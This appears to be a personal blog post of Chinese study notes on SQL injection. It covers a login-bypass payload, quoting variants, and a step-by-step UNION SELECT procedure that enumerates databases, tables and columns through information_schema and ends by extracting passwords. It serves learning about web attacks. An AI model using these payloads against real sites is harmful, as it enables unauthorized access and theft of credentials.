---
title: '''sql_inject_Process'''
date: 2018-12-28 20:21:52
tags: sql注入流程
---

> 留言板安全问题

`用户名root ' or 1 = 1#`
	`密码1`
	-->万能密码注入



> 原理：

​	SELECT * FROM users WHERE username='$user' AND passwd ='".md5($pwd).被变成

select * from root username = 'root ' or 1=1 # 'and passwd =''

#后面被注释了   1=1导致查询语句总为真 衡真的原理

判断能否注入：
	用户能控制输入的内容
	web应用能把用户输入的内容带到数据库中
	

> 测试是否存在注入

​	
分类：
	根据输入内容：	字符型注入、数字型注入
	根据上面两种类型可以加括号和字符能使用双引号和单引号，分为：以下几种
	

​	1.select * from users where id=1 纯数字型
		2.select * from users where id='1'只加单引号
		3.select * from users where id="1" 只加双引号
		4.select * from users where (id=1)数字加括号
		5.select * from users where (id='1')单引号加括号
		6.select * from users where (id="1")双引号加括号



> 快速注入流程：-->脑图

​	

> 步骤1.先加’看看会不会有变化，

​	如果变化了-->可能是纯数字、只有单引号、单引号加括号、数字加括号
	

如果不出现变化-->双引号、

步骤2.再加‘%23页面会回复正常

步骤3.依次排除字符的类型

步骤4.再在后面加入 1、0



> 注入可以做哪些事：

获取数据-->
	修改数据
	上传文件
	读取文件

> mysql常用   

​	limit 0,1 从0开始取1条记录-->限制输出结果的行数

select user()	显示当前用户
	select database()显示当前使用的数据库
	select version()显示版本
	select group_concat();连接字符串
		
​	select 0x313233会把16进制-->正常数字  0x7e -->~

联合查询 union select 1，2，3，4，5
	需要列数一致，如果不清楚列数，可以用order by来查询

order by 通过指定列数进行排序-->用来判断有多少列

distinct 去重

> 数据库目录知识：	*****

​	information_schema库-->schemata表 存放所有数据库信息，是公用数据库，任何用户都可以访问

information_schema.schemata   表存放所有数据库名字

information_schema.TABLES  表存放所有表的名字

information_schema.COLUMN  表存放所有字段名字

column_name	字段名
	table_schema	库名字段
	table_name   表名字段



查询数据库中有那些库
select schema_name from information_schema.SCHEMATA

查询数据库中有那些表
select table_name from information_schema.TABLES

查询数据库中test库中有哪些表
select table_name from information_schema.TABLES where table_schema = 'test'  // test 可以写成 0x7a73

查询数据库中有那些字段
select column_name from information_schema.COLUMNS

查询数据库中test库中user表有哪些字段
select column_name from information_schema.COLUMNS where table_schema = 'test' and table_name = 'user'	

有了库名，表名，列名，然后-->

猜解内容
	select pass from test.user;
	
​	

> 总体流程 

​	1~用‘尝试有没有注入--->可能有注入

2~用%23 报错恢复-->数字型注入

3~用order by 1 2 3 4-->测有多少列

4~用union select 1，2，3进行输出，发现页面不显示-->显示不下

5~更改显示的内容 -->用limit 1，1或者改条件为id =0

6~找到1，2，3中显示的数字，改为想要查询的语句

7.开始查询数据库-->把查询数据库语句替换数字，发现只能显示一行，-->尝试在sql语句两侧加入（），还是不行-->加入group_concat，发现正常

理解：直接放入sql语句不符合代码规范，必须括起来；加入group_concat恢复正常，是因为查询所有的库名字时返回的结果是多行，而union select 的第三位是只能写单行内容！！！，所以用group_concat进行组合成一行	

